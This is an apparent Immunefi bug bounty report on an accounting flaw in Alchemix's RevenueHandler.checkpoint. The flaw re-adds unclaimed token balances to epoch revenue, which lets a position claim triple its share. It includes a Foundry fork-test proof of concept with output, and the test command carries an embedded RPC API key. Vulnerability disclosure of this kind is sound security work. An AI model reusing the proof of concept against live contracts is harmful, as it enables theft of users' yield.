# 31253 - \[SC - Critical] RevenueHandlercheckpoint isnt correctly

Submitted on May 15th 2024 at 20:16:14 UTC by @jasonxiale for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31253

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RewardsDistributor.sol>

Impacts:

* Theft of unclaimed yield

## Description

## Brief/Intro

`RevenueHandler.checkpoint` isn't correctly when `tokenConfig.poolAdapter` is **0**, which cause `epochRevenues` record wrong number, so some users will claim more token than expected, and other user can't claim the tokens

## Vulnerability Details

`RevenueHandler.checkpoint` isn't correctly when `tokenConfig.poolAdapter` is **0**, which cause `epochRevenues` record wrong number, so some users will claim more token than expected, and other user can't claim the tokens

## Vulnerability Details

In [RevenueHandler.checkpoint](https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/RevenueHandler.sol#L228-L268), if `tokenConfig.poolAdapter` is zero, `epochRevenues[currentEpoch][token] += amountReceived;` is used to update value, and `thisBalance` is equal to `IERC20(token).balanceOf(address(this))` **The issue is that `IERC20(token).balanceOf(address(this))` may contains the token that hasn't been claimed. In such case, it means that the amount will be added twice.**

```solidity
228     function checkpoint() public {
229         // only run checkpoint() once per epoch
230         if (block.timestamp >= currentEpoch + WEEK /* && initializer == address(0) */) {
231             currentEpoch = (block.timestamp / WEEK) * WEEK;
232 
233             uint256 length = revenueTokens.length;
234             for (uint256 i = 0; i < length; i++) {
	...
244 
245                 uint256 thisBalance = IERC20(token).balanceOf(address(this));
246 
247                 // If poolAdapter is set, the revenue token is an alchemic-token
248                 if (tokenConfig.poolAdapter != address(0)) {
	...
258                 } else {
259                     // If the revenue token doesn't have a poolAdapter, it is not an alchemic-token
260                     amountReceived = thisBalance;  <<<--- thisBalance is IERC20(token).balanceOf(address(this));

261 
262                     // Update amount of non-alchemic-token revenue received for this epoch
263                     epochRevenues[currentEpoch][token] += amountReceived; <<<--- += is used here
264                 }
265 
266                 emit RevenueRealized(currentEpoch, token, tokenConfig.debtToken, amountReceived, treasuryAmt);
267             }
268         }
269     }
```

## Impact Details

`epochRevenues` isn't updated correctly in some case, so some users will claim more token than expected, and other user can't claim the tokens

## References

Add any relevant links to documentation or code

## Proof of Concept

Put the following code in `src/test/RevenueHandler.t.sol` and run

```bash
FOUNDRY_PROFILE=default forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/0TbY2mhyGA4gLPShfh-PwBlQ3PDNUdL1 --fork-block-number 17133822 --mc RevenueHandlerTest --mt testTwoCheckpoint -vv
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for src/test/RevenueHandler.t.sol:RevenueHandlerTest
[PASS] testTwoCheckpoint() (gas: 2223762)
Logs:
  currentEpoch                    : 1686182400
  revenueHandler.epochRevenues    : 1000000000000000000000
  dai.balanceOf(revenueHandler)   : 1000000000000000000000
  revenueHandler.claimable        : 1000000000000000000000
  currentEpoch                    : 1687392000
  revenueHandler.epochRevenues    : 1000000000000000000000
  dai.balanceOf(revenueHandler)   : 1000000000000000000000
  revenueHandler.claimable        : 2000000000000000000000
  currentEpoch                    : 1688601600
  revenueHandler.epochRevenues    : 1000000000000000000000
  dai.balanceOf(revenueHandler)   : 1000000000000000000000
  revenueHandler.claimable        : 3000000000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.07ms (2.69ms CPU time)

Ran 1 test suite in 1.22s (6.07ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

As we can see from the test, only `1000e18` DAI is transferred to `revenueHandler`, but the `tokenId` can claim 3000e18 DAI

```solidity
    function testTwoCheckpoint() external {
        uint256 currentEpoch;
        uint256 WEEK = 2 weeks;
        revenueHandler.setPoolAdapter(dai, address(0));

        uint tokenId = _initializeVeALCXPosition(10e18);

        _jumpOneEpoch();
        _jumpOneEpoch();
        _jumpOneEpoch();

        uint256 revAmt = 1000e18;
        _accrueRevenue(dai, revAmt);
        revenueHandler.checkpoint();
        currentEpoch = (block.timestamp / WEEK) * WEEK;

        console2.log("currentEpoch                    :", currentEpoch);
        console2.log("revenueHandler.epochRevenues    :", revenueHandler.epochRevenues(currentEpoch, dai));
        console2.log("dai.balanceOf(revenueHandler)   :", IERC20(dai).balanceOf(address(revenueHandler)));
        console2.log("revenueHandler.claimable        :", revenueHandler.claimable(tokenId, dai));

        _jumpOneEpoch();
        revenueHandler.checkpoint();
        currentEpoch = (block.timestamp / WEEK) * WEEK;
        console2.log("currentEpoch                    :", currentEpoch);
        console2.log("revenueHandler.epochRevenues    :", revenueHandler.epochRevenues(currentEpoch, dai));
        console2.log("dai.balanceOf(revenueHandler)   :", IERC20(dai).balanceOf(address(revenueHandler)));
        console2.log("revenueHandler.claimable        :", revenueHandler.claimable(tokenId, dai));

        _jumpOneEpoch();
        revenueHandler.checkpoint();
        currentEpoch = (block.timestamp / WEEK) * WEEK;
        console2.log("currentEpoch                    :", currentEpoch);
        console2.log("revenueHandler.epochRevenues    :", revenueHandler.epochRevenues(currentEpoch, dai));
        console2.log("dai.balanceOf(revenueHandler)   :", IERC20(dai).balanceOf(address(revenueHandler)));
        console2.log("revenueHandler.claimable        :", revenueHandler.claimable(tokenId, dai));
    }
```
